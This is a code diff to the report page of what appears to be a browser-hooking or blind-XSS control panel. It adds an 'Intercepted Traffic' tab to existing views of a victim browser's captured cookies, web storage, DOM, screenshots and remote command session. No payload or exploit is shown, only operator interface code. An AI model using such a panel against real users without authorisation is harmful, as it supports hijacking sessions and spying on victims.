@@ -26,12 +26,21 @@ import {
     Wand2,
     FileText,
     Shield,
-    ShieldOff
+    ShieldOff,
+    Radio,
+    ChevronDown,
+    ChevronRight,
+    ChevronLeft,
+    ChevronsDown,
+    ChevronsUp,
+    Ban,
+    AlertTriangle
 } from 'lucide-react';
 import { cn } from '@/lib/utils';
 import { useSettings } from '@/lib/settings-context';
+import { Badge } from '@/components/ui/badge';
 
-type TabType = 'storage' | 'dom' | 'persist';
+type TabType = 'storage' | 'dom' | 'persist' | 'traffic';
 
 interface ReportData {
     id: string;
@@ -39,6 +48,7 @@ interface ReportData {
     dom: string | null;
     screenshot: string | null;
     screenshot_storage: string | null;
+    screenshot_error: string | null;
     localstorage: string | null;
     sessionstorage: string | null;
 }
@@ -62,6 +72,23 @@ interface SessionStatus {
     lastResponse?: string | null;
     lastResponseAt?: string | null;
     encrypted?: boolean;
+    sessionStatus?: string | null;
+    terminated?: boolean;
+    popupBlocked?: boolean;
+}
+
+interface TrafficItem {
+    id: string;
+    report_id: string;
+    traffic_type: string;
+    method: string | null;
+    url: string | null;
+    request_headers: string | null;
+    request_body: string | null;
+    response_headers: string | null;
+    response_body: string | null;
+    status_code: number | null;
+    captured_at: string;
 }
 
 export default function ReportDetailPage() {
@@ -79,6 +106,62 @@ export default function ReportDetailPage() {
     const [sending, setSending] = useState(false);
     const [cmdResult, setCmdResult] = useState<{ success: boolean; message: string } | null>(null);
 
+    // Traffic state
+    const [trafficData, setTrafficData] = useState<TrafficItem[]>([]);
+    const [trafficLoading, setTrafficLoading] = useState(false);
+    const [expandedTraffic, setExpandedTraffic] = useState<Set<string>>(new Set());
+    const [trafficPage, setTrafficPage] = useState(1);
+    const trafficPerPage = 20;
+
+    // Format seconds as human-readable relative time
+    const formatRelativeTime = (seconds: number): string => {
+        if (seconds < 60) return `${seconds}s ago`;
+        if (seconds < 3600) {
+            const mins = Math.floor(seconds / 60);
+            return `${mins}m ago`;
+        }
+        if (seconds < 86400) {
+            const hours = Math.floor(seconds / 3600);
+            const mins = Math.floor((seconds % 3600) / 60);
+            return mins > 0 ? `${hours}h ${mins}m ago` : `${hours}h ago`;
+        }
+        const days = Math.floor(seconds / 86400);
+        const hours = Math.floor((seconds % 86400) / 3600);
+        return hours > 0 ? `${days}d ${hours}h ago` : `${days}d ago`;
+    };
+
+    const toggleTrafficExpand = (id: string) => {
+        setExpandedTraffic(prev => {
+            const next = new Set(prev);
+            if (next.has(id)) {
+                next.delete(id);
+            } else {
+                next.add(id);
+            }
+            return next;
+        });
+    };
+
+    const expandAllTraffic = () => {
+        const allIds = paginatedTraffic
+            .filter(item => item.request_headers || item.request_body || item.response_headers || item.response_body)
+            .map(item => item.id);
+        setExpandedTraffic(new Set(allIds));
+    };
+
+    const collapseAllTraffic = () => {
+        setExpandedTraffic(new Set());
+    };
+
+    // Paginated traffic data
+    const paginatedTraffic = useMemo(() => {
+        const start = (trafficPage - 1) * trafficPerPage;
+        const end = start + trafficPerPage;
+        return trafficData.slice(start, end);
+    }, [trafficData, trafficPage]);
+
+    const totalTrafficPages = Math.ceil(trafficData.length / trafficPerPage);
+
     const checkSessionStatus = useCallback(async () => {
         if (!params.id) return;
         try {
@@ -89,6 +172,22 @@ export default function ReportDetailPage() {
             }
         } catch (error) {
             console.error('Failed to check session:', error);
+        }
+    }, [params.id]);
+
+    const fetchTrafficData = useCallback(async () => {
+        if (!params.id) return;
+        try {
+            setTrafficLoading(true);
+            const res = await fetch(`/api/traffic?report_id=${params.id}`);
+            if (res.ok) {
+                const data = await res.json();
+                setTrafficData(data.traffic || []);
+            }
+        } catch (error) {
+            console.error('Failed to fetch traffic:', error);
+        } finally {
+            setTrafficLoading(false);
         }
     }, [params.id]);
 
@@ -108,11 +207,19 @@ export default function ReportDetailPage() {
         };
         fetchReport();
         checkSessionStatus();
+        fetchTrafficData();
 
-        // Poll session status every 5 seconds
-        const interval = setInterval(checkSessionStatus, 5000);
+        // Poll session status and traffic every 5 seconds, but stop if terminated
+        const interval = setInterval(() => {
+            // Don't poll if session is terminated
+            if (sessionStatus?.terminated) {
+                return;
+            }
+            checkSessionStatus();
+            fetchTrafficData();
+        }, 5000);
         return () => clearInterval(interval);
-    }, [params.id, router, checkSessionStatus]);
+    }, [params.id, router, checkSessionStatus, fetchTrafficData, sessionStatus?.terminated]);
 
     const copyToClipboard = async (text: string, key: string) => {
         await navigator.clipboard.writeText(text);
@@ -134,36 +241,52 @@ export default function ReportDetailPage() {
         let formatted = '';
         let indent = 0;
         const tab = '  ';
-        
+
         // Simple tokenizer
         const tokens = html.replace(/>\s*</g, '>\n<').split('\n');
-        
+
         tokens.forEach(token => {
             token = token.trim();
             if (!token) return;
-            
+
             // Check if it's a closing tag
             if (token.match(/^<\/\w/)) {
                 indent = Math.max(0, indent - 1);
             }
-            
+
             formatted += tab.repeat(indent) + token + '\n';
-            
+
             // Check if it's an opening tag (not self-closing, not closing)
             if (token.match(/^<\w[^>]*[^\/]>$/) && !token.match(/^<(br|hr|img|input|meta|link)/i)) {
                 indent++;
             }
         });
-        
+
         return formatted.trim();
     };
 
-    const [isBeautified, setIsBeautified] = useState(true);
-    
+    const [isBeautified, setIsBeautified] = useState(false);
+    const [showFullDom, setShowFullDom] = useState(false);
+    const DOM_PREVIEW_SIZE = 100000; // 100KB preview
+
     const processedDom = useMemo(() => {
         if (!report?.data?.dom) return '';
-        return isBeautified ? beautifyHtml(report.data.dom) : report.data.dom;
-    }, [report?.data?.dom, isBeautified]);
+        const dom = report.data.dom;
+        const needsTruncation = dom.length > DOM_PREVIEW_SIZE && !showFullDom;
+        const displayDom = needsTruncation ? dom.substring(0, DOM_PREVIEW_SIZE) : dom;
+        return isBeautified ? beautifyHtml(displayDom) : displayDom;
+    }, [report?.data?.dom, isBeautified, showFullDom]);
+
+    const isDomTruncated = useMemo(() => {
+        return (report?.data?.dom?.length || 0) > DOM_PREVIEW_SIZE && !showFullDom;
+    }, [report?.data?.dom, showFullDom]);
+
+    const domSizeInfo = useMemo(() => {
+        const size = report?.data?.dom?.length || 0;
+        if (size > 1000000) return `${(size / 1000000).toFixed(2)} MB`;
+        if (size > 1000) return `${(size / 1000).toFixed(1)} KB`;
+        return `${size} bytes`;
+    }, [report?.data?.dom]);
 
     const sendCommand = async () => {
         if (!command || !params.id) return;
@@ -211,8 +334,8 @@ export default function ReportDetailPage() {
         // If stored in object storage (s3), route through API with storage hint
         if (storage === 's3') {
             // Extract filename from URL or path
-            const filename = screenshot.includes('/') 
-                ? screenshot.split('/').pop() 
+            const filename = screenshot.includes('/')
+                ? screenshot.split('/').pop()
                 : screenshot;
             return `/api/screenshots/${filename}?storage=s3`;
         }
@@ -252,6 +375,7 @@ export default function ReportDetailPage() {
         { id: 'storage' as TabType, label: 'Storage', icon: Database, show: !!(report.cookies || report.data?.localstorage || report.data?.sessionstorage) },
         { id: 'dom' as TabType, label: 'DOM', icon: FileCode, show: !!report.data?.dom },
         { id: 'persist' as TabType, label: 'Persistent Mode', icon: Terminal, show: true },
+        { id: 'traffic' as TabType, label: 'Traffic', icon: Radio, show: true, count: trafficData.length },
     ].filter(t => t.show);
 
     const detailItems = [
@@ -285,11 +409,25 @@ export default function ReportDetailPage() {
                 {/* Connection Status */}
                 <div className={cn(
                     "flex items-center gap-2 px-3 py-1.5 rounded text-sm",
-                    sessionStatus?.connected
-                        ? 'bg-emerald-500/20 border border-emerald-500/30'
-                        : 'bg-[#18181c] border border-[#27272a]'
+                    sessionStatus?.terminated
+                        ? 'bg-red-500/20 border border-red-500/30'
+                        : sessionStatus?.popupBlocked
+                            ? 'bg-amber-500/20 border border-amber-500/30'
+                            : sessionStatus?.connected
+                                ? 'bg-emerald-500/20 border border-emerald-500/30'
+                                : 'bg-[#18181c] border border-[#27272a]'
                 )}>
-                    {sessionStatus?.connected ? (
+                    {sessionStatus?.terminated ? (
+                        <>
+                            <Ban className="w-3.5 h-3.5 text-red-400" />
+                            <span className="text-red-400 font-medium">Terminated</span>
+                        </>
+                    ) : sessionStatus?.popupBlocked ? (
+                        <>
+                            <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
+                            <span className="text-amber-400 font-medium">Popup Blocked</span>
+                        </>
+                    ) : sessionStatus?.connected ? (
                         <>
                             <Wifi className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                             <span className="text-emerald-400 font-medium">Connected</span>
@@ -359,7 +497,7 @@ export default function ReportDetailPage() {
                     </div>
                     <div className="p-4">
                         {report.data?.screenshot ? (
-                            <div 
+                            <div
                                 className="rounded border border-[#27272a] bg-[#09090b] overflow-hidden cursor-pointer hover:border-[#3f3f46] transition-colors"
                                 onClick={openScreenshotFullscreen}
                             >
@@ -368,6 +506,12 @@ export default function ReportDetailPage() {
                                     alt="Page screenshot"
                                     className="w-full h-auto max-h-[300px] object-contain"
                                 />
+                            </div>
+                        ) : report.data?.screenshot_error ? (
+                            <div className="flex flex-col items-center justify-center py-12 text-muted-foreground">
+                                <ImageIcon className="w-10 h-10 mb-2 opacity-30 text-red-500" />
+                                <p className="text-sm text-red-400">Screenshot capture failed</p>
+                                <p className="text-xs mt-1 text-zinc-500">{report.data.screenshot_error}</p>
                             </div>
                         ) : (
                             <div className="flex flex-col items-center justify-center py-12 text-muted-foreground">
@@ -400,6 +544,11 @@ export default function ReportDetailPage() {
                                     {tab.label}
                                     {tab.id === 'persist' && sessionStatus?.connected && (
                                         <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
+                                    )}
+                                    {tab.id === 'traffic' && 'count' in tab && (
+                                        <Badge variant="secondary" className="ml-1 h-5 px-1.5 text-xs bg-amber-500/20 text-amber-400 border-none">
+                                            {tab.count}
+                                        </Badge>
                                     )}
                                 </button>
                             );
@@ -460,16 +609,38 @@ export default function ReportDetailPage() {
                                         <FileCode className="w-4 h-4 text-cyan-400" />
                                         <h3 className="font-medium text-white text-sm">DOM HTML</h3>
                                         <span className="text-xs px-1.5 py-0.5 rounded bg-cyan-500/20 text-cyan-400">
-                                            {(report.data.dom.length / 1024).toFixed(1)} KB
+                                            {domSizeInfo}
                                         </span>
+                                        {isDomTruncated && (
+                                            <span className="text-xs px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-400">
+                                                Preview (100 KB)
+                                            </span>
+                                        )}
                                     </div>
                                     <div className="flex items-center gap-1">
+                                        {isDomTruncated && (
+                                            <button
+                                                onClick={() => setShowFullDom(true)}
+                                                className="flex items-center gap-1.5 px-2.5 py-1 rounded text-xs bg-amber-500/20 text-amber-400 hover:bg-amber-500/30 transition-colors"
+                                            >
+                                                <FileCode className="w-3.5 h-3.5" />
+                                                Load Full DOM
+                                            </button>
+                                        )}
+                                        {showFullDom && (report.data.dom.length > DOM_PREVIEW_SIZE) && (
+                                            <button
+                                                onClick={() => setShowFullDom(false)}
+                                                className="flex items-center gap-1.5 px-2.5 py-1 rounded text-xs bg-zinc-500/20 text-zinc-400 hover:bg-zinc-500/30 transition-colors"
+                                            >
+                                                Show Preview
+                                            </button>
+                                        )}
                                         <button
                                             onClick={() => setIsBeautified(!isBeautified)}
                                             className={cn(
                                                 "flex items-center gap-1.5 px-2.5 py-1 rounded text-xs transition-colors",
-                                                isBeautified 
-                                                    ? "bg-cyan-500/20 text-cyan-400" 
+                                                isBeautified
+                                                    ? "bg-cyan-500/20 text-cyan-400"
                                                     : "bg-[#27272a] text-muted-foreground hover:text-white"
                                             )}
                                         >
@@ -477,7 +648,8 @@ export default function ReportDetailPage() {
                                             Beautify
                                         </button>
                                         <button
-                                            onClick={() => copyToClipboard(processedDom, 'dom')}
+                                            onClick={() => copyToClipboard(report.data?.dom || '', 'dom')}
+                                            title="Copy full DOM"
                                             className="p-1.5 rounded hover:bg-[#27272a] text-muted-foreground hover:text-white transition-colors"
                                         >
                                             {copied === 'dom' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
@@ -507,6 +679,11 @@ export default function ReportDetailPage() {
                                     >
                                         {processedDom}
                                     </SyntaxHighlighter>
+                                    {isDomTruncated && (
+                                        <div className="mt-2 p-2 rounded bg-amber-500/10 border border-amber-500/20 text-amber-400 text-xs text-center">
+                                            Showing first 100 KB of {domSizeInfo}. Click &quot;Load Full DOM&quot; to view complete content.
+                                        </div>
+                                    )}
                                 </div>
                             </div>
                         )}
@@ -527,7 +704,7 @@ export default function ReportDetailPage() {
                                                 <Wifi className="w-4 h-4 text-emerald-400 animate-pulse" />
                                                 <div>
                                                     <p className="text-emerald-400 font-medium text-sm">Session Active</p>
-                                                    <p className="text-emerald-400/70 text-xs">Last seen {sessionStatus.diffSeconds}s ago</p>
+                                                    <p className="text-emerald-400/70 text-xs">Last seen {formatRelativeTime(sessionStatus.diffSeconds || 0)}</p>
                                                 </div>
                                             </>
                                         ) : (
@@ -537,7 +714,7 @@ export default function ReportDetailPage() {
                                                     <p className="text-muted-foreground font-medium text-sm">No Active Session</p>
                                                     <p className="text-muted-foreground text-xs">
                                                         {sessionStatus?.lastSeen
-                                                            ? `Last seen ${sessionStatus.diffSeconds}s ago`
+                                                            ? `Last seen ${formatRelativeTime(sessionStatus.diffSeconds || 0)}`
                                                             : 'Victim browser has not connected'}
                                                     </p>
                                                 </div>
@@ -598,8 +775,8 @@ export default function ReportDetailPage() {
                                 {cmdResult && (
                                     <div className={cn(
                                         "p-3 rounded text-sm",
-                                        cmdResult.success 
-                                            ? 'bg-emerald-500/10 border border-emerald-500/20 text-emerald-400' 
+                                        cmdResult.success
+                                            ? 'bg-emerald-500/10 border border-emerald-500/20 text-emerald-400'
                                             : 'bg-red-500/10 border border-red-500/20 text-red-400'
                                     )}>
                                         {cmdResult.message}
@@ -663,6 +840,250 @@ export default function ReportDetailPage() {
                                         )}
                                     </div>
                                 </div>
+                            </div>
+                        )}
+
+                        {/* Traffic Tab */}
+                        {activeTab === 'traffic' && (
+                            <div className="p-4 space-y-3">
+                                <div className="flex items-center justify-between mb-3">
+                                    <div className="flex items-center gap-2">
+                                        <Radio className="w-4 h-4 text-amber-400" />
+                                        <h3 className="font-medium text-white text-sm">Intercepted Traffic</h3>
+                                        <Badge variant="secondary" className="h-5 px-1.5 text-xs bg-amber-500/10 text-amber-400 border-none">
+                                            {trafficData.length} requests
+                                        </Badge>
+                                    </div>
+                                    <div className="flex items-center gap-2">
+                                        {trafficData.length > 0 && (
+                                            <>
+                                                <button
+                                                    onClick={expandAllTraffic}
+                                                    className="px-2 py-1 text-xs text-muted-foreground hover:text-white hover:bg-[#27272a] rounded transition-colors"
+                                                    title="Expand all"
+                                                >
+                                                    <ChevronsDown className="w-4 h-4" />
+                                                </button>
+                                                <button
+                                                    onClick={collapseAllTraffic}
+                                                    className="px-2 py-1 text-xs text-muted-foreground hover:text-white hover:bg-[#27272a] rounded transition-colors"
+                                                    title="Collapse all"
+                                                >
+                                                    <ChevronsUp className="w-4 h-4" />
+                                                </button>
+                                            </>
+                                        )}
+                                        {trafficLoading && (
+                                            <Loader2 className="w-4 h-4 animate-spin text-muted-foreground" />
+                                        )}
+                                        {/* Session Status Badge */}
+                                        {sessionStatus?.terminated && (
+                                            <Badge variant="secondary" className="h-5 px-2 text-xs bg-red-500/10 text-red-400 border-none">
+                                                <Ban className="w-3 h-3 mr-1" />
+                                                Session Terminated
+                                            </Badge>
+                                        )}
+                                        {sessionStatus?.popupBlocked && !sessionStatus?.terminated && (
+                                            <Badge variant="secondary" className="h-5 px-2 text-xs bg-amber-500/10 text-amber-400 border-none">
+                                                <AlertTriangle className="w-3 h-3 mr-1" />
+                                                Popup Blocked
+                                            </Badge>
+                                        )}
+                                    </div>
+                                </div>
+
+                                {trafficData.length === 0 ? (
+                                    <div className="py-8 text-center text-muted-foreground text-sm">
+                                        <Radio className="w-8 h-8 mx-auto mb-2 opacity-30" />
+                                        <p>No traffic captured yet</p>
+                                        <p className="text-xs mt-1">Enable Traffic Interception mode to capture network requests</p>
+                                    </div>
+                                ) : (
+                                    <>
+                                        <div className="space-y-2">
+                                            {paginatedTraffic.map((item) => {
+                                                const isExpanded = expandedTraffic.has(item.id);
+                                                const hasDetails = item.request_headers || item.request_body || item.response_headers || item.response_body;
+                                                
+                                                // Build full raw request
+                                                const buildRawRequest = () => {
+                                                    let raw = `${item.method || 'GET'} ${item.url || '/'} HTTP/1.1\r\n`;
+                                                    if (item.request_headers) raw += item.request_headers;
+                                                    if (item.request_body) raw += `\r\n${item.request_body}`;
+                                                    return raw;
+                                                };
+                                                
+                                                // Build full raw response
+                                                const buildRawResponse = () => {
+                                                    let raw = `HTTP/1.1 ${item.status_code || 200} OK\r\n`;
+                                                    if (item.response_headers) raw += item.response_headers;
+                                                    if (item.response_body) raw += `\r\n${item.response_body}`;
+                                                    return raw;
+                                                };
+                                                
+                                                return (
+                                                    <div 
+                                                        key={item.id} 
+                                                        className="rounded bg-[#09090b] border border-[#27272a] hover:border-[#3f3f46] transition-colors overflow-hidden"
+                                                    >
+                                                        {/* Header - Clickable */}
+                                                        <div 
+                                                            className={cn(
+                                                                "p-3 flex items-center gap-2 cursor-pointer select-none",
+                                                                hasDetails && "hover:bg-[#18181c]"
+                                                            )}
+                                                            onClick={() => hasDetails && toggleTrafficExpand(item.id)}
+                                                        >
+                                                            {hasDetails ? (
+                                                                isExpanded ? (
+                                                                    <ChevronDown className="w-4 h-4 text-muted-foreground flex-shrink-0" />
+                                                                ) : (
+                                                                    <ChevronRight className="w-4 h-4 text-muted-foreground flex-shrink-0" />
+                                                                )
+                                                            ) : (
+                                                                <div className="w-4" />
+                                                            )}
+                                                            
+                                                            <Badge
+                                                                variant="secondary"
+                                                                className={cn(
+                                                                    "h-5 px-1.5 text-xs border-none font-mono flex-shrink-0",
+                                                                    item.method === 'POST' ? 'bg-amber-500/20 text-amber-400' :
+                                                                    item.method === 'PUT' ? 'bg-blue-500/20 text-blue-400' :
+                                                                    item.method === 'DELETE' ? 'bg-red-500/20 text-red-400' :
+                                                                    item.method === 'PATCH' ? 'bg-purple-500/20 text-purple-400' :
+                                                                    'bg-emerald-500/20 text-emerald-400'
+                                                                )}
+                                                            >
+                                                                {item.method || 'GET'}
+                                                            </Badge>
+                                                            
+                                                            {item.status_code && (
+                                                                <Badge
+                                                                    variant="secondary"
+                                                                    className={cn(
+                                                                        "h-5 px-1.5 text-xs border-none flex-shrink-0",
+                                                                        item.status_code >= 200 && item.status_code < 300
+                                                                            ? 'bg-emerald-500/20 text-emerald-400'
+                                                                            : item.status_code >= 400
+                                                                                ? 'bg-red-500/20 text-red-400'
+                                                                                : 'bg-amber-500/20 text-amber-400'
+                                                                    )}
+                                                                >
+                                                                    {item.status_code}
+                                                                </Badge>
+                                                            )}
+                                                            
+                                                            <div className="flex-1 min-w-0">
+                                                                <span className="text-sm font-mono text-white truncate block" title={item.url || ''}>
+                                                                    {item.url || 'Unknown URL'}
+                                                                </span>
+                                                            </div>
+                                                            
+                                                            <span className="text-xs text-muted-foreground flex-shrink-0">
+                                                                {formatDateTime(item.captured_at)}
+                                                            </span>
+                                                        </div>
+                                                        
+                                                        {/* Expanded Details */}
+                                                        {isExpanded && hasDetails && (
+                                                            <div className="border-t border-[#27272a] p-3 space-y-3 bg-[#0c0c0e]">
+                                                                {/* Full URL */}
+                                                                <div>
+                                                                    <div className="flex items-center justify-between mb-1">
+                                                                        <span className="text-xs text-muted-foreground font-medium">URL</span>
+                                                                        <button
+                                                                            onClick={(e) => {
+                                                                                e.stopPropagation();
+                                                                                copyToClipboard(item.url || '', `url-${item.id}`);
+                                                                            }}
+                                                                            className="p-1 rounded hover:bg-[#27272a] text-muted-foreground hover:text-white transition-colors"
+                                                                        >
+                                                                            {copied === `url-${item.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
+                                                                        </button>
+                                                                    </div>
+                                                                    <pre className="text-xs text-cyan-400 font-mono bg-black/30 p-2 rounded overflow-x-auto break-all whitespace-pre-wrap">
+                                                                        {item.url}
+                                                                    </pre>
+                                                                </div>
+                                                                
+                                                                {/* Full Request */}
+                                                                {(item.request_headers || item.request_body) && (
+                                                                    <div>
+                                                                        <div className="flex items-center justify-between mb-1">
+                                                                            <span className="text-xs text-muted-foreground font-medium">Request</span>
+                                                                            <button
+                                                                                onClick={(e) => {
+                                                                                    e.stopPropagation();
+                                                                                    copyToClipboard(buildRawRequest(), `req-${item.id}`);
+                                                                                }}
+                                                                                className="p-1 rounded hover:bg-[#27272a] text-muted-foreground hover:text-white transition-colors"
+                                                                            >
+                                                                                {copied === `req-${item.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
+                                                                            </button>
+                                                                        </div>
+                                                                        <pre className="text-xs text-orange-400 font-mono bg-black/30 p-2 rounded overflow-x-auto max-h-60 overflow-y-auto whitespace-pre-wrap">
+                                                                            {buildRawRequest()}
+                                                                        </pre>
+                                                                    </div>
+                                                                )}
+                                                                
+                                                                {/* Full Response */}
+                                                                {(item.response_headers || item.response_body) && (
+                                                                    <div>
+                                                                        <div className="flex items-center justify-between mb-1">
+                                                                            <span className="text-xs text-muted-foreground font-medium">Response</span>
+                                                                            <button
+                                                                                onClick={(e) => {
+                                                                                    e.stopPropagation();
+                                                                                    copyToClipboard(buildRawResponse(), `res-${item.id}`);
+                                                                                }}
+                                                                                className="p-1 rounded hover:bg-[#27272a] text-muted-foreground hover:text-white transition-colors"
+                                                                            >
+                                                                                {copied === `res-${item.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
+                                                                            </button>
+                                                                        </div>
+                                                                        <pre className="text-xs text-emerald-400 font-mono bg-black/30 p-2 rounded overflow-x-auto max-h-60 overflow-y-auto whitespace-pre-wrap">
+                                                                            {buildRawResponse()}
+                                                                        </pre>
+                                                                    </div>
+                                                                )}
+                                                            </div>
+                                                        )}
+                                                    </div>
+                                                );
+                                            })}
+                                        </div>
+                                        
+                                        {/* Pagination */}
+                                        {totalTrafficPages > 1 && (
+                                            <div className="flex items-center justify-between pt-3 border-t border-[#27272a]">
+                                                <span className="text-xs text-muted-foreground">
+                                                    Showing {((trafficPage - 1) * trafficPerPage) + 1} - {Math.min(trafficPage * trafficPerPage, trafficData.length)} of {trafficData.length}
+                                                </span>
+                                                <div className="flex items-center gap-1">
+                                                    <button
+                                                        onClick={() => setTrafficPage(p => Math.max(1, p - 1))}
+                                                        disabled={trafficPage === 1}
+                                                        className="p-1.5 rounded hover:bg-[#27272a] text-muted-foreground hover:text-white transition-colors disabled:opacity-30 disabled:cursor-not-allowed"
+                                                    >
+                                                        <ChevronLeft className="w-4 h-4" />
+                                                    </button>
+                                                    <span className="px-3 py-1 text-sm text-white">
+                                                        {trafficPage} / {totalTrafficPages}
+                                                    </span>
+                                                    <button
+                                                        onClick={() => setTrafficPage(p => Math.min(totalTrafficPages, p + 1))}
+                                                        disabled={trafficPage === totalTrafficPages}
+                                                        className="p-1.5 rounded hover:bg-[#27272a] text-muted-foreground hover:text-white transition-colors disabled:opacity-30 disabled:cursor-not-allowed"
+                                                    >
+                                                        <ChevronRight className="w-4 h-4" />
+                                                    </button>
+                                                </div>
+                                            </div>
+                                        )}
+                                    </>
+                                )}
                             </div>
                         )}
                     </div>
